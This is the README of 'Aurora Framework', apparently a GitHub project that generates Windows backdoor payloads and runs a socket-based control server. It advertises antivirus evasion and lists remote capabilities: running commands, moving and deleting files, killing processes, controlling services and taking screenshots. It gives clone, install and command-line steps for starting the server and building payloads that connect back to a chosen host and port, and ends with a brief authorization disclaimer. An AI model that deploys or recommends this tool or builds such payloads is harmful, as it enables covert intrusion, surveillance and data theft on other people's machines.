# Aurora Framework

[![Python](https://img.shields.io/badge/Python-%E2%89%A5%203.6-yellow.svg)](https://www.python.org/) 
[![License](https://img.shields.io/badge/License-BSD-red.svg)](https://github.com/t3l3machus/hoaxshell/blob/main/LICENSE.md)
<img src="https://img.shields.io/badge/Maintained%3F-Yes-96c40f">

## Purpose
⚡This tool is a backdoor generator for Windows systems that uses sockets to establish a connection and is highly capable of bypassing antivirus software.It has a control server and a variety of payloads, and comes with a number of useful features.

## Features
- Root shell `Administrator permission required`
- System information
- Delete files & folder on the host machine. 
- Execute commands on target machine.
- Upload/Download any type of files.
- Get all processes running in a system.
- Kill process by name, id etc...
- Enable/Disable windows services.
- Start/Stop windows service.
- Start/Restart windows system.
- Screenshot
- Download files

## How to install
```
git clone https://github.com/hxrshdeepsingh/Aurora-Framework
```
```
cd Aurora-Framework
```
```
pip install -r requirements.txt
```
```
python aurora.py --help
```  

## Setup Server
```
python aurora.py server --help
```
```
python aurora.py server --host <HOST> --port <PORT>
```

## Build Payload
```
python aurora.py payload --help
```
```
python aurora.py payload --name <NAME> --host <HOST> --port <PORT> --time <RECONNECTION TIME>
```

## Disclaimer
This tool is for educational and testing purposes only. Do not use its payloads on hosts without proper authorization. You are responsible for any consequences resulting from its use.